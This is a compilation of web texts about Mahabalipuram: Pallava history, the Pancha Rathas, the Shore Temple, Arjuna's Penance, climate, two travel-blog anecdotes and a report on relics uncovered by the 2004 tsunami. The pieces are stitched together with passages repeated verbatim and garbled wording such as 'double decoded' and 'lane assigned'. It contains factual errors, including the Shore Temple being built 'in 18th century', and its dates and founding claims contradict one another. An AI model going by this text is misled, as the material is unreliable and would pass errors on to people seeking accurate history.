Mahabalipuram or Mamallapuram is a historic city and UNESCO World Heritage site in Tamil Nadu, India. During the reign of the Pallava dynasty, between the 3rd century CE and 7th century CE, it became an important centre of art, architecture and literature. Mahabalipuram was already a thriving sea port on the Bay of Bengal before this time. A significant amount of coins and other artefacts excavated from this region also indicate a pre-existing trade relation with the Romans even before it became a part of the Pallava Empire.Mahabalipuram’s early history is completely shrouded in mystery. Ancient mariners considered this place the land of the Seven Pagodas. There are others who think that Mahabalipuram suffered from a great flood between 10,000 and 13,000 BCE. Controversial historian Graham Hancock was one of the core members of a team of divers from Indian National Institute of Oceanography and the Scientific Exploration Society based in Dorset, UK who surveyed the ocean bed near Mahabalipuram in 2002 CE. He is more inclined to believe the flood theory. His exploration also afforded him a fair glimpse of the vast extent of submerged ruins of the city. After his underwater exploration, he reportedly commented, “I have argued for many years that the world’s flood myths deserve to be taken seriously, a view that most Western academics reject … But here in Mahabalipuram, we have proved the myths right and the academics wrong.” The Adi Varaha Perumal Cave Temple is the earliest of all Pallava structures in Mahabalipuram, yet the least visited one. The grandeur of the actual mandapa (pavilion) is hidden behind a rather ordinary looking latter-day structure. The construction of this site began before the reign of Mahendravarman I. The temple is dedicated to Vishnu (Varaha is an incarnation of Vishnu) and its execution follows the spirit of Vaishnava Agamic texts. Both the outer hall and sanctum sanatorium are adorned with elaborate relief sculptures. This temple houses two relief sculptures of Pallava kings, Simhavishnu (c. 537 CE – 570 CE) and Mahendravarman I, accompanied by their respective wives.Pancha Ratha (five chariots) is an architectural ode to Mahabharata’s five Pandava brothers Yudhistir, Bhima, Arjuna, Nakula, Sahadeva, and their wife Draupadi. Thematically and structurally, each ratha is significantly different from the other ones, but all of them were carved out of a long stone or monolith. Spread over one to three storeys, their forms vary from square to apsidal. The walls of these ancient edifices are decorated with bas-reliefs and murals. A beautifully carved monolithic airavata (elephant) and nandi (bull) decorate the premises. Though originally meant to be places of worships, these were never consecrated and used actively for any sacred rites.Ironically, while the tsunami in 2004 CE created substantial damage to the existing structures and left the city water-logged for days, it also unearthed some of the treasures long hidden in the bosom of the sea. Granite sculptures, bronze statues and ruins of what seem to be manmade structures came to the fore. Underwater archaeologist Dr Alok Tripathi commented, “As the tsunami waves receded, they scoured away sand deposits that had covered these sculptures for centuries.” The underwater survey of Mahabalipuram is an ongoing process that promises to reveal many more of the city’s grand edifices and solve some of the long standing questions about its past.

Mamallapuram was one of two major port cities by the 7th century within the Pallava kingdom. Along with economic prosperity, it became a center of a group of battle monuments carved out of rock. These are dated to the 7th and 8th centuries: rathas (temples in the form of chariots), mandapas (cave sanctuaries), giant open-air rock reliefs such as the famous Descent of the Ganges, and the Shore Temple dedicated to Shiva, Durga, Vishnu, Krishna and others.[1][2] . It was constructed by Vishwakarma community peoples.The contemporary town plan was established by the British Raj in 1827.[3]
Neolithic 
burial urn, cairn circles and jars with burials dating to the very dawn of the Christian era have been discovered near Mamallapuram. The Sangam age poem Perumpāṇāṟṟuppaṭai relates the rule of King Thondaiman Ilam Thiraiyar at Kanchipuram of the Tondai Nadu port Nirppeyyaru which scholars identify with the present-day Mamallapuram. Chinese coins and Roman coins of Theodosius I in the 4th century CE have been found at Mamallapuram revealing the port as an active hub of global trade in the late classical period. Two Pallava coins bearing legends read as Srihari and Srinidhi have been found at Mamallapuram. The Pallava kings ruled Mamallapuram from Kanchipuram; the capital of the Pallava dynasty from the 3rd century to 9th century CE, and used the port to launch trade and diplomatic missions to Sri Lanka and Southeast Asia.
An 8th-century Tamil text written by Thirumangai Alvar described this place as Sea Mountain ‘where the ships rode at anchor bent to the point of breaking laden as they were with wealth, big trunked elephants and gems of nine varieties in heaps’. It is also known by several other names such as MAMALLAPATINAM and Mamallapuram. Another name by which Mamallapuram has been known to mariners, at least since Marco Polo’s time is "Seven Pagodas" alluding to the Seven Pagodas of Mamallapuram that stood on the shore, of which one, the Shore Temple, survives.[4]
The temples of Mapuram, portraying events described in the Mahabharata, were built largely during the reigns of Narasimhavarman and his successor Rajasimhavarman and show the movement from rock-cut architecture to structural building. The city of Mamallapuram was founded by the Pallava king Narasimhavarman I in the 7th century AD.[4] The mandapa or pavilions and the rathas or shrines shaped as temple chariots are hewn from the granite rock face, while the famed Shore Temple, erected half a century later, is built from dressed stone. What makes Mamallapuram so culturally resonant are the influences it absorbs and disseminates. The Shore Temple includes many reliefs, including one 100 ft. long and 45 ft. high, carved out of granite.[5]
Mahabalipuram has a tropical climate. The Köppen-Geiger climate classification is Aw. The average annual temperature is 28.4 °C. The temperatures are highest on average in May, at around 32.6 °C. In January, the average temperature is 24.3 °C, the lowest  of the year. The average temperatures vary during the year by 8.3 °C. In a year, the average rainfall is 1219 mm. In winter, there is much less rainfall than in summer. The variation in the precipitation between the driest and wettest months is 309 mm. 
The site has 40 ancient monuments and Hindu temples,[8] including Descent of the Ganges or Arjuna's Penance – one of the largest open-air rock relief in the world.[1][9] The site includes several categories of monuments: ratha temples with an architecture of monolith processional chariots built between 630 and 668 CE; the mandapa viharas with halls and stone roofs with narratives from the Mahabharata, Shaktism and Vaishnavism; rock reliefs particularly bas-reliefs of Shaivism, Shaktism and Vaishnavism; stone cut temples particularly those dedicated to Shiva that also reverentially display Vishnu and others, built between 695 and 722 CE; and, archaeological excavations with inscriptions some dated to 6th century and earlier.[7][10] The cave temples and monolithic temples were built during the Pallava Period.[2][7][11] The site is managed by the Archaeological Survey of India.[12]

																		Mahabalipuram got its name after the demon king Mahabali. The history of the city goes beyond the Pallava dynasty. It was a seaport city since the 1st century and was used by traders for travelling abroad. The city flourished and was brought to limelight in the 7th to 9th century under the Pallava rule. 
It is believed that Mahabalipuram was renamed to Mamallapuram after the Pallava King Narsimha Varman I who went by the name Mamallan because of his great wrestling skills. Pallava kings made Mahabalipuram their capital and brought new artistic styles to the culture. The city takes pride in the stone carved sculptures, temples, and man-made curvings, and white sandy beaches.

The glory and elegance of Mahabalipuram History, is attributed to three Pallava kings – Mahendravarman I (600-630AD), Narasimhavarman I (630- 666AD) and Narasimhavarman II (700-728 AD. The city was established between 7th and 9th centuries CE. After the decline of the Gupta Dynasty, Pallava kings ruled Mahabalipuram from 3rd century to 9th century CE and during this period various historic monuments built largely between the 7th and the 9th centuries, and some of the monuments have been classified as a UNESCO World Heritage Site.Mahabalipuram was mainly developed by the Pallava king Narasimhavarman I in the 7th century AD. Panch Rathas(Five Chariots) are named given after the five Pandava brothers from the great hindu epic Mahabharata which is built and shaped from the granite rock. Five Rathas in Mahabalipuram History are the perfect example of Dravidian style architecture. They appear same to the Buddhist shrines and monasteries Lots of Monolithic temples, Famous Arjuna's Penance, Stunning Shore Temple all this historical monuments accredited to the period of Narasimha Varman I. All these monuments are sculpted of a single rock.

Pancha Rathas also referred as Pandava Rathas are the most excellent architectural edifices of the nine monolithic temples of Mahabalipuram situated on the Coromandel Coast of the Bay of Bengal, near Chennai. The five structures each chiselled in the shape of rathas or chariots out of large block of stone or monolith of granite typifies monolithic Indian rock-cut architecture that dates back to the 7th century during the reign of the Pallava dynasty. The five rathas are named as ‘Dharmaraja Ratha’, ‘Bhima Ratha’, ‘Arjuna Ratha’, ‘Nakula Sahadeva Ratha’, and ‘Draupadi Ratha’ after the five Pandava brothers and their common spouse Draupadi from the great Indian epic ‘Mahabharata’. Although unfinished and never consecrated, these rathas that are often erroneously referred as temples are now part of the monument complex that is marked as ‘Group of Monuments at Mahabalipuram’ by ‘UNESCO’. It is enlisted in UNESCO’s World Heritage sites. Maintained under the patronage of the ‘Archaeological Survey of India’ (ASI), this complex has remained one of the famous tourist destinations of south India that became exemplar of and laid the foundation of a new architectural style, the temple architecture of South India.The construction of the five rathas is traced back to the 7th century during the reign of King Mahendravarman I from 600–630 CE and his son Narasimhavarman I from 630–668 AD of the Pallava dynasty. An ASI inscribed tablet at the site mentions that the concept of carving the rocks in the shape of chariots or rathas was made by the Pallava dynasty keeping wooden rathas as prototypes. Construction work of the structures stopped after the demise of Narasimhavarman I in 668 AD. These structures illustrating the Dravidian architecture later became templates to temples of much higher dimensions constructed in the region subsequently. The reason for constructing the rathas, most of which have reflections of the Buddhist Viharas and Chaityas is not known till date. Although there is no connection between the structures and the Pandavas of the great Indian epic, the ‘Mahabharata’, and ASI proposed referring the structures as vimanas, but the names of Pandavas has incessantly remained linked with the structures. In 1984 UNESCO marked the place as World Heritage Site.The most imposing and architecturally superior structure as also the largest and soaring among the five rathas is the Dharmaraja Ratha. Dedicated to Lord Shiva, this elaborately sculptured tritala or three-storied vimana facing west has square talas with the ground floor measuring a square of 8.5 m with a height of 11 m. The facades of each of its four sides rest on two pillars and two pilasters. Features of the vimana includes open porches, progressively smaller storeys giving the structure the shape of a pyramidal tower having terrace and a shikhara, octagonal in shape, at the apex. The corners of the sanctum are adorned with several sculptures that include simple forms of Shiva, Krishna, Skanda, Brahma-Sasta, Harihara, Brahma and Ardhanarisvara. A portrait of a king, presumably that of Narasimhavarman I with inscriptions of his titles, Megha and Trailokiya –vardhana-vidhi etched above it finds place besides the sculptures. Name of the sanctum ‘Atyantakama Pallavesvaram’ is etched in the uppermost tier. ‘Atyantakama’ is considered a title of Paramesvaravarman I. The upper portion of the structure is decorated with kudus or horseshoe-arch dormer like projections. Sculptures of lions in sitting position are constructed to support the shafts of the pillars. The first floor is ornate with 22 carvings including the ones illustrating Lord Shiva as Natesa and Gangadara and Lord Krishna dancing atop Kaliya Mardhana and resting on Garuda. The second floor also contains rich carvings with several figures like that of Somaskanda and Dakshinamurthy. This ektala vimana facing west is an oblong structure with a base measuring 12.8 m by 7.3 m and a height of 7.6 m. It reminds one of the Buddhist cave architecture like the Sala-Shikhara. Dedicated to Lord Vishnu, this structure has a barrel-vaulted terrace and decorated columned porch, suggestive of palace architectural style. It is chiselled out of a pink granite boulder which soars gradually from north to south. The lower floor of the vimana, although incomplete indicates the plan that was chalked out for the floor that include a pillar-rested circumambulatory passage. It has open veranda with long pillars, lion mounted columned galleries on both long sides and kudus. Such embellishments are sculpted on the façade of the structure atop the cornices that demarks the two floors. The cornices connected to a passage are carved with oblong-shaped shrines. The gable ends are embellished with beautiful motifs while the interior of the vimana are inscribed with Nasikas.This dvi-tala or two tiered vimana facing west and carved out of a live rock measuring 3.5 m by 4.9 m with a height of 6.1 m is dedicated to Lord Shiva. It shares the same upapitha or secondary platform with the Draupadi Ratha. The structure of the Arjuna Ratha is quiet simple and looks like a small palace. Although very much akin to the Dharmaraja Ratha, it differs from the latter in some respects which includes having one tier less than the latter, shape of the dome being octagonal and front yard adorned with a finely chiselled stone lion.  The garbhagriha or sanctum sanctorum has a pillared Mukhamandapa or inner porch. The entrance of the ratha rests on two pillars and two lion mounted carved pilasters. The four sides of the cornices are decorated with kudus. Simple Padabandha style is manifested from the architecture of the adhisthana which is the platform of the main deity. In-between the exquisitely carved pillars lies slit-niches that consist of figures of several deities like Siva-Vrishabhantika, Skanda on an elephant and Vishnu as also figures of apsaras, a Siddha, Parthiharas, a Chowri bearer and Amaras to mention a few. The 8 niches of the second storey consist of carved figures of couples. A figure of Lord Shiva’s mount, Nandi the bull, is housed on the rear of the ratha.This ratha dedicated to Lord Indra was named after the twins Nakula and Sahadeva, the last two of the Pandava brothers. It is the only ratha among the five that faces south and to some extent resembles a Chaitya Hall that is a Buddhist prayer hall. As the structure looks like backside of an elephant, it is referred as ‘Gajaprishtakara’ and the style as ‘gajapristha’. A monolithic sculpture of an elephant also finds place beside the ratha. Constructed on the same base as that of the Dharmaraja, Bhima and Arjuna rathas, this dvitala or two tiered structure has an apsidal plan. Although the ratha is devoid of any idol to worship, carved figures of gods and demi-gods adorn the niches of its interior walls.Named after the common wife of the Pancha Pandavas, this ratha which lies at the northern end of the five rathas is dedicated to Goddess Durga. Constructed in the form of a small hut of Bengal, it is the smallest of the five rathas, and measures 3.4 m by 3.4 m with a height of 5.5 m. The curvilinear thatched roof is devoid of any finial but is embellished with motifs in the joints. The high rise platform leading to the entrance door of the west facing ratha is decorated with sculptures of lion and elephant heads chiselled alternately. Durga images adorn the ratha, particularly on the sanctum that portrays Goddess Durga standing on a lotus and also on the exterior surface of the wall facing east.

Mamallapuram, also known as Mahabalipuram, is a town in Kancheepuram district in the Indian state of Tamil Nadu, around 60 km south of the city of Chennai. Mahabalipuram is a beautiful city located in the Indian state of Tamil Nadu. The city is known to the world for its architectural and artistic excellence, sandy beaches and casuarina trees. The city has been named after King Mahabali, who has killed y the Lord Vishnu. Thirukadalmallai, Varaha Cave Temple, The Shore Temple, Krishna’s Butterball and Mahishamardini Cave are few popular attractions in Mahabalipuram that are visited by a large number of tourists every year. During the Pallavas rule, new forms of architecture bloomed and several great architectural establishments came into existence. Massive rock cut caves and numerous temples can be seen over here.The Mahabalipuram History is two thousand years old. It was the port city of South Indian dynasty of Pallavas during the 7th century. The Pallavas ruled Mahabalipuram from 3rd century to 9th century. Located 60 km south of Chennai this town is enriched with a number of heritage monuments. These historic monuments were constructed during the 7th and 9th centuries, and have been listed as UNESCO World Heritage site. During the early 18th century Mahabalipuram grew as the pilgrimage center, nowadays it has become the favorite place of tourists where they get relaxation and enjoy sea bathing. At a nearby place from here, it has an atomic plant.The descent of the Ganges is a monument at Mahabalipuram, on the Coromandel Coast of the Bay of Bengal, in the Kancheepuram district of the state of Tamil Nadu, India. Measuring 96 by 43 feet (29 m × 13 m), it is a giant open-air relief carved off two monolithic rock boulders. The bas-relief is more of a canvas of Indian rock cut sculpture at its best not seen anywhere in India. It is one of the Group of Monuments at Mahabalipuram that were designated as a UNESCO World Heritage Site since 1984. Its huge size and scale are difficult to imagine just from photographs; a person standing on the ground in front of it could barely touch the elephants’ feet.This is located at the entrance gate, which is spectacular and simple, shaped like a hut and is dedicated to goddess Durga. Female door keepers stand on the either ride of the Rath, one holding a bow and another, a sword. At the eastern wall, a bas-relief stands to portray Goddess Durga standing on a lotus and two worshippers at here feet offering flowers and one of the person’s head respectively. Energy other walls have the figure of the great goddess, and at the front of the temple is a Lion’s figure, which is the celestial vehicle to the Goddess.In front of Arjuna’s Rath is the Nakula – Sahadev Rath. This is a double decoded building, dedicated to Lord Indra the God of Rain. As in Greek and Roman mythologies, where there are different gods for various aspects and qualified, the Indian mythologies too lane assigned specific gods for different aspects. There is some proof depicting this Ratha to which might have been dedicated to Subramanya associated with elephants. The elephant’s shaped sculptures face towards the sea. One who enters the Panch Rathas can visualize the back portion of the elephants and it named as Gajaprishthakara which means elephant’s backside. The elephant sculptures are huge and are highlights of the Panch Raths.Of all the five Rathas, this last one stands hugely. It is named after the eldest of the pandavas. Innovative and well-carved designs can be seen in this Rath. This resembles the Arjuna’s Rath and it is a perfect example to the later built South Indian Temples. This Rath is also dedicated to Lord Shiva like that of Arjuna’s Rath. The ground floor is incomplete. Above the ground floor stands minutely designed double floor. The peculiarity in this monumental construction is that there is no stair route from the ground floor to the first floor, but, there in stairs from the first floor to the second floor. There are eight panels in the ground floor. One panel is carved with the portrait of the kind and the rest of gods and goddesses. On one particular wall, the figure of shiva is named ‘Ardhanariswarar’ which is the mixture of Shiva and Shakti. This is very attractive as one can find the manly structure and the luring female charm. Other portrayals show lord shiva as ‘Bhikshatana’ – meaning cosmic designer and the god of death.The Shore Temple is so named because it overlooks the shore of the Bay of Bengal. It is a structural temple, built with blocks of granite, dating from the 8th century AD. Shore Temple is also acknowledged for being the first stone structure made by Pallavas. Before this, the monuments used to be carved out of the rocks or stones. Unlike other monuments of the region, Shore Temple is a five-storied rock-cut structural temple more willingly than monolithical. In southern India, this is one amongst the earliest and most important structural temples. The spire is extensively decorated with carvings and sculptures. In the recent years, a stone wall has been constructed to protect the shrine from further sea-erosion.Mahabalipuram beach attracts a lot of travelers every year especially for the natural Sunbathing on the beach. The beach gives an opportunity to completely unwind from the weary and tiredness of the city life. Windsurfers and Swimmers are seen hitting the shores of the beach playing with the rising tide. Mahabalipuram beach of India, to charm the visitors also has a crocodile bank, a snake venom extracting center, a school of art and sculpture. There are resorts all along the beach to serve the empty stomach of the tourists.

The glory and elegance of Mahabalipuram History, is attributed to three Pallava kings – Mahendravarman I (600-630AD), Narasimhavarman I (630- 666AD) and Narasimhavarman II (700-728 AD. The city was established between 7th and 9th centuries CE. After the decline of the Gupta Dynasty, Pallava kings ruled Mahabalipuram from 3rd century to 9th century CE and during this period various historic monuments built largely between the 7th and the 9th centuries, and some of the monuments have been classified as a UNESCO World Heritage Site.Mahabalipuram was mainly developed by the Pallava king Narasimhavarman I in the 7th century AD. Panch Rathas(Five Chariots) are named given after the five Pandava brothers from the great hindu epic Mahabharata which is built and shaped from the granite rock. Five Rathas in Mahabalipuram History are the perfect example of Dravidian style architecture. They appear same to the Buddhist shrines and monasteries Lots of Monolithic temples, Famous Arjuna's Penance, Stunning Shore Temple all this historical monuments accredited to the period of Narasimha Varman I. All these monuments are sculpted of a single rock.

The antique stone architecture of Mahabalipuram talks about the stone carving history of Mahabalipuram. The fascinating towers of famous “Shore temple” which is one of the "Seven  pagodas” were constructed by King Narasimha Varman in 18th century during Pallava period. The five monolithic Rathas (chariots) are carved in granite and can be seen in pyramidal structures and are named as Dharma raja Ratha, Bhima Ratha, Arjuna Ratha, Draupadi Ratha, Nakul Sahadev Ratha. These Rathas are carved from one single piece of stone which is an interesting attribute. The world famous Arjuna’s Penance which is an episode from Hindu epic Mahabharata is excellently composed with great passion to represent classical essence. Dharma raja Ratha with its highly skilled carvings involves complicated decorative forms. The monolithic rock-cut architecture of Varaha cave temple is a testimony to creative imagination.  All these monuments are the outstanding examples of Pallavas art and architecture and remarkable in Indian cultural heritage.

We started early at 6 am from Bangalore city and reached Mahabalipuram late afternoon(~350 kms) (we stopped for sumptuous sea-food lunch along the way).  There are a plenty of hotels and resorts along ECR (Eastern Coastal Road) in this area. The best part is the amazing view of Bay of Bengal they offer as most of the resorts/hotels are sea-facing. We booked one such beautiful, sea-facing white house along ECR for us via Airbnb. The house was equipped with all necessary facilities and offered breath-taking view of Bay of Bengal from the patio. It was aptly named ‘Kadal‘ which translates to ‘sea’ in local Tamil language.The temple was designed to look like a monolith but a major portion of the temple has actually been reconstructed after the tsunamis and cyclones. The temple is built right on the shore such that the first rays of the rising Sun falls on the Shiva lingam located on the eastern side of the temple. Around a hundred grand Nandis (sacred bull who is the gatekeeper of Shiva’s realm) surround the sanctum of the temple from all sides. After mesmerizing ourselves with the temple structure, we sat on the rocks marveling at the dolphins farther in the sea. Next, we had quick-lunch and visited other structures which are all within walking distance. The important ones being:After a tiring but enriching day, we spent rest of the night relaxing in our ‘Kadal’. It was peaceful night listening to soothing ocean waves while gently swaying in our hammocks. We were awakened by the magical rays of sunrise. It was time to leave. But not before roaming aimlessly in the sands.  While strolling on the beach, we spotted busy fishermen pulling their net from the sea. All the fishermen worked together to pull the net towards shore. There were thousands of fish of different varieties (even manta-rays, sea-snakes along with usual varieties) trapped in the net. The fishermen carefully separated poisonous variety of fish from others. Women arrived with their containers to divide their catch and dispersed to nearby market for selling.

 The click clack sounds of artisans chipping away at blocks of stone drifed through the the bylanes of Mahabalipuram as we entered this sleepy town, home to the famous Shore Temple overlooking the Bay of Bengal. Our local guide Ashok, gave us the 'standard' tour starting with Krishna's butterball, a giant rock precariously balanced on a slope, proceeding to the exquisite bas relief of Arjuna's penance painstakingly carved out of a giant boulder, taking in the beauty of the Pancha Ratha (5 chariots) complex and ending at the marvel of architecture that is the Shore temple. The life exuding from each carving  stood as mute testimony to the skill of artisans and engineers from centuries ago (the temples date back to the 7th and 9th centuries) and the resilience of the kings and their people in overcoming multiple 'problems' to create such amazing works of art. (Note: In Ashok's vocabulary everything from a tsunami, to a marauding army, to corrupt politicians was a 'problem'). Tour over, we strolled into the backpacker part of town, making our way past half the town gawking at a film shoot, ladies hawking fresh fruit and flowers and ended up at a small 'French' cafe which even had chicken with red wine sauce! As we said goodbye and headed down the coastal highway to Pondicherry, the click clack sounds slowly faded to the background, a living testimony to how art and tradition are still passed on from generation to generation, in the world heritage site that is  Mahabalipuram......

Mamallapuram, also known as Mahabalipuram, is a town in Kancheepuram district in the Indian state of Tamil Nadu, around 60 km south of the city of Chennai. Mahabalipuram is a beautiful city located in the Indian state of Tamil Nadu. The city is known to the world for its architectural and artistic excellence, sandy beaches and casuarina trees. The city has been named after King Mahabali, who has killed y the Lord Vishnu. Thirukadalmallai, Varaha Cave Temple, The Shore Temple, Krishna’s Butterball and Mahishamardini Cave are few popular attractions in Mahabalipuram that are visited by a large number of tourists every year. During the Pallavas rule, new forms of architecture bloomed and several great architectural establishments came into existence. Massive rock cut caves and numerous temples can be seen over here.The Mahabalipuram History is two thousand years old. It was the port city of South Indian dynasty of Pallavas during the 7th century. The Pallavas ruled Mahabalipuram from 3rd century to 9th century. Located 60 km south of Chennai this town is enriched with a number of heritage monuments. These historic monuments were constructed during the 7th and 9th centuries, and have been listed as UNESCO World Heritage site. During the early 18th century Mahabalipuram grew as the pilgrimage center, nowadays it has become the favorite place of tourists where they get relaxation and enjoy sea bathing. At a nearby place from here, it has an atomic plant.The descent of the Ganges is a monument at Mahabalipuram, on the Coromandel Coast of the Bay of Bengal, in the Kancheepuram district of the state of Tamil Nadu, India. Measuring 96 by 43 feet (29 m × 13 m), it is a giant open-air relief carved off two monolithic rock boulders. The bas-relief is more of a canvas of Indian rock cut sculpture at its best not seen anywhere in India. It is one of the Group of Monuments at Mahabalipuram that were designated as a UNESCO World Heritage Site since 1984. Its huge size and scale are difficult to imagine just from photographs; a person standing on the ground in front of it could barely touch the elephants’ feet.This is located at the entrance gate, which is spectacular and simple, shaped like a hut and is dedicated to goddess Durga. Female door keepers stand on the either ride of the Rath, one holding a bow and another, a sword. At the eastern wall, a bas-relief stands to portray Goddess Durga standing on a lotus and two worshippers at here feet offering flowers and one of the person’s head respectively. Energy other walls have the figure of the great goddess, and at the front of the temple is a Lion’s figure, which is the celestial vehicle to the Goddess.In front of Arjuna’s Rath is the Nakula – Sahadev Rath. This is a double decoded building, dedicated to Lord Indra the God of Rain. As in Greek and Roman mythologies, where there are different gods for various aspects and qualified, the Indian mythologies too lane assigned specific gods for different aspects. There is some proof depicting this Ratha to which might have been dedicated to Subramanya associated with elephants. The elephant’s shaped sculptures face towards the sea. One who enters the Panch Rathas can visualize the back portion of the elephants and it named as Gajaprishthakara which means elephant’s backside. The elephant sculptures are huge and are highlights of the Panch Raths.Of all the five Rathas, this last one stands hugely. It is named after the eldest of the pandavas. Innovative and well-carved designs can be seen in this Rath. This resembles the Arjuna’s Rath and it is a perfect example to the later built South Indian Temples. This Rath is also dedicated to Lord Shiva like that of Arjuna’s Rath. The ground floor is incomplete. Above the ground floor stands minutely designed double floor. The peculiarity in this monumental construction is that there is no stair route from the ground floor to the first floor, but, there in stairs from the first floor to the second floor. There are eight panels in the ground floor. One panel is carved with the portrait of the kind and the rest of gods and goddesses. On one particular wall, the figure of shiva is named ‘Ardhanariswarar’ which is the mixture of Shiva and Shakti. This is very attractive as one can find the manly structure and the luring female charm. Other portrayals show lord shiva as ‘Bhikshatana’ – meaning cosmic designer and the god of death.The Shore Temple is so named because it overlooks the shore of the Bay of Bengal. It is a structural temple, built with blocks of granite, dating from the 8th century AD. Shore Temple is also acknowledged for being the first stone structure made by Pallavas. Before this, the monuments used to be carved out of the rocks or stones. Unlike other monuments of the region, Shore Temple is a five-storied rock-cut structural temple more willingly than monolithical. In southern India, this is one amongst the earliest and most important structural temples. The spire is extensively decorated with carvings and sculptures. In the recent years, a stone wall has been constructed to protect the shrine from further sea-erosion.Mahabalipuram beach attracts a lot of travelers every year especially for the natural Sunbathing on the beach. The beach gives an opportunity to completely unwind from the weary and tiredness of the city life. Windsurfers and Swimmers are seen hitting the shores of the beach playing with the rising tide. Mahabalipuram beach of India, to charm the visitors also has a crocodile bank, a snake venom extracting center, a school of art and sculpture. There are resorts all along the beach to serve the empty stomach of the tourists.

The December 2004 tsunami, which battered much of the south Indian coast, has helped unearth priceless relics in the ancient port city of Mahabalipuram in Tamil Nadu. The killer waves shifted thousands of tonnes of sand to uncover granite sculptures which archaeologists claim, are remnants of a seventh-century civilisation. The sculptures include an elaborately carved lion, a half-completed elephant and a stallion in flight.  "As the tsunami waves receded, they scoured away sand deposits that had covered these sculptures for centuries," says Alok Tripathi, an underwater archaeologist. Tripathi, who led the Archaeological Survey of India (asi)  team that excavated Mahabalipuram, says the discoveries throw new light on this ancient port city, south of Chennai.

 Ways of the sea Mahabalipuram was an important centre of the Pallava dynasty, which held sway over much of south India between the fourth and the ninth century.Known for  its Shore Temple, the city has been designated by the  unesco  as a World Heritage Site. Legend has it that Mahabalipuram had six other temples --  seafarers referred to it as the land of seven pagodas till even two centuries ago -- which were consumed by waves (see box:  Land of seven pagodas).    The city has also been the subject of much scholarly curiosity.  asi  had begun excavations here in 2001. But the tsunami threw a spanner in their works. Only for a brief while, however: the archaeologists got going again after a report from local fisherfolk. Just before the tsunami waves struck on December 26, 2004, the sea withdrew about 500 metres, baring its bed on which lay a temple structure and several rock sculptures, the tsunami-struck fisherfolk announced after they had recovered some of their bearings.   Once the waves subsided,  asi  researchers enlisted help of divers from the navy to scan the deep seas. "We found some stone structures which appear to be man-made.  They are perfect rectangular blocks arranged in a clear pattern," says Tripathi.  






The urn (above) and the lion statue 
(below) unearthed by the tsunami could be part of a temple or a port 
city, say scholars






 

 The investigators also found partly submerged blocks of walls, some of which extended into the land. "Our investigations showed that the partially submerged blocks and those completely under water are part of one edifice," said Tripathi. "The blocks appear to be part of a temple wall," the archaeologist added. Other parts of the temple that surfaced include a square  garbha griha  -- the sanctum sanctorium -- an elegant terracotta ring well and a sandstone  kalash  (an urn).   Standing guard The archaeologists are, however, not ruling out other possibilities. Some of them speculate that the granite beasts uncovered by the receding waves once stood guard at a port city's entrance. The 2-metre high lion statues, each hewn from a single piece of granite, appear breathtakingly lifelike. One great stone cat sits up alert while the other is poised to pounce. The elephant could have also been sculpted to adorn the city walls, the archaeologists believe. It now attracts scores of visitors who touch its eroded trunk as a good luck talisman.   Lions, elephants and peacocks were commonly used to decorate walls during the Pallava period, say members of the  asi  team. "The findings reveal Pallava grandeur," says one of them.  The survivor   Why did these structures get submerged, while the Shore Temple stayed put for 1,300 years, withstanding even the tsunami? Tripathi has an answer. "The Shore Temple is built on bed-rock. So it survived all these years. But the other structures were constructed on sand. They could not have withstood a forceful accident," says the archaeologist. He believes  asi's  investigations in Mahabalipuram could be of immense help in protecting coastal monuments, which are threatened by the incursion of the sea.

The Mahabalipuram History is two thousand years old. It was the port city of South Indian dynasty of Pallavas during 7th century. The Pallavas ruled Mahabalipuram from 3rd century to 9th century. Located 60 km south of Chennai this town is enriched with a number of heritage monuments. These historic monuments were constructed during the 7th and 9th centuries, and have been listed as UNESCO World Heritage site. During the early 18th century Mahabalipuram grew as the pilgrimage center, now a days it has become the favorite place of tourists where they get relaxation and enjoy sea bathing. At a nearby place from here it has an atomic plant.
Mamallapuram, popularly known as Mahabalipuram is named after the 7th century Pallava king Narasimha Varman I, Mammalan who was a great warrior and wrestler. It is a living testimony to the artistic temperament of the great Pallava kings who were trendsetters of the Dravidian architecture.Classified as a UNESCO World Heritage Centre, Mahabalipuram boasts of various historic monuments built during the Pallava period between 7th and 9th centuries. A popular tourist destination on the outskirts of Chennai, Mahabalipuram attracts many tourists.Located around 60 km south of Chennai, this architectural splendor along the coast of Bay of Bengal has withstood the ravages of time and the recent Tsunami. The rock-cut monolithic monuments are good examples of Dravidian architecture that also portray elements of Buddhist design.
The name of Mahabalipuram is derived from a Tamil word Mamallapuram. Mahabalipuram can literally meant as the city of great wrestler as the Mahabalipuram means the city of maha bali (powerful). This historic town is situated in Kancheepuram district of South Indian state Tamilnadu.
It was a sea-port during the time of Periplus (1st century AD) and Ptolemy (AD 140) and many Indian colonists sailed to South-East Asia through this port town. While there is some evidence of architectural activity going back to the period of Mahendravarman-I (AD 600-30), the father of Mamalla, most of the monuments like rock-cut rathas, sculptured scenes on open rocks like Arjuna's penance, the caves of Govardhanadhari and Mahishasuramardini, the Jala-Sayana Perumal temple (the sleeping Mahavishnu or Chakrin at the rear part of the Shore temple complex) are attributed to the period of Narasimhavarman-I Mamalla.
Of the nine monolithic temples found in Mahabalipuram, the most important are Five Rathas known after the famous five Pandava brothers of the Mahabharata fame. These monuments are carved out a single rock with choice of all known forms of plan and elevations. While the Dharmaraja, Arjuna and Draupadi rathas are square on plan, the Bhima and Ganesa rathas are rectangular and Sahadeva ratha apsidal.
The Draupadi ratha is a simple hut like kutagara shrine while the Arjuna ratha is a dvitala vimana with a mukhamandapa. The Bhima ratha is rectangular on plan with a salakara wagon-vaulted roof. The Dharmaraja ratha is a tritala vimana having functional shrines at all the talas. The Nakula-Sahadeva ratha with an apsidal plan and elevation indicate the experimental tendency of the architect.
Though monolithic sculpturing, both cut-in and cut-out, continued even during later periods (Atiranachanda cave, Pidari rathas and Tiger-cave), the structural architecture was introduced on a grand scale by Pallava Rajasimha (AD 700-28), culminating in erection of the world famous Shore temple. The Shore temple is a complex of three temples, viz, Rajasimhesvara (a small tritala vimana facing west), the Kshatriyasimhesvara (the larger east facing vimana) and Nripatisimha Pallava Vishnugriha (an east facing, oblong, flat-roofed mandapa shrine) housing the reclining Vishnu. These shrines are enclosed by two prakara walls with openings constructed in later times. The inner surface of prakara walls once contained panel sculptures which are worn out now.
The notable cave temples here are the Varaha mandapa, Mahisamardini mandapa, Paramesvara Mahavaraha Vishnugriha (Adivaraha cave). These are in the Mamalla style while the Adiranchanda caves temples belong to the Mahendra period.
The caves here were once plastered and painted as indicated by the remains. After Rajasimha, there is lull in the architectural activity of the place, save a few additions during late-Pallava and Chola times. The grandiose Vijayanagara phase here is represented by the Raja Gopurams and the Sthala-Sayana temple, juxtaposed to the carved boulder of Arjuna's penance.

